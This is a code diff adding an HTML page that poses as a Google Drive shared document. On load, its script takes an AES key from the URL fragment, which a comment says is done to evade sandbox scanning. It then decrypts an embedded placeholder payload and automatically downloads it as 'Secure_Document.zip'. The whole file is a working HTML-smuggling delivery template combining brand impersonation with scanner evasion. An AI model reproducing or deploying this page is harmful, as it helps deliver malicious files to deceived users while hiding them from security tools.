@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head><title>Google Drive - Shared Document</title></head>
+<body>
+    <div id="status">Verifying access...</div>
+    <script>
+        async function start() {
+            // Retrieve key from URL hash (#) to evade sandbox scanning
+            const keyHex = window.location.hash.substring(1);
+            if (!keyHex) { document.getElementById('status').innerText = "Access Denied."; return; }
+
+            const data = {
+                content: "{{PAYLOAD}}",
+                iv: "{{IV}}",
+                tag: "{{TAG}}"
+            };
+
+            try {
+                const rawKey = new Uint8Array(keyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+                const cryptoKey = await crypto.subtle.importKey("raw", rawKey, "AES-GCM", true, ["decrypt"]);
+                
+                const encrypted = Uint8Array.from(atob(data.content), c => c.charCodeAt(0));
+                const iv = Uint8Array.from(atob(data.iv), c => c.charCodeAt(0));
+                const tag = Uint8Array.from(atob(data.tag), c => c.charCodeAt(0));
+
+                const combined = new Uint8Array(encrypted.length + tag.length);
+                combined.set(encrypted);
+                combined.set(tag, encrypted.length);
+
+                const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, cryptoKey, combined);
+                const url = URL.createObjectURL(new Blob([decrypted]));
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = "Secure_Document.zip";
+                a.click();
+                document.getElementById('status').innerText = "Download Started.";
+            } catch (e) {
+                document.getElementById('status').innerText = "Invalid Session Key.";
+            }
+        }
+        window.onload = start;
+    </script>
+</body>
+</html>
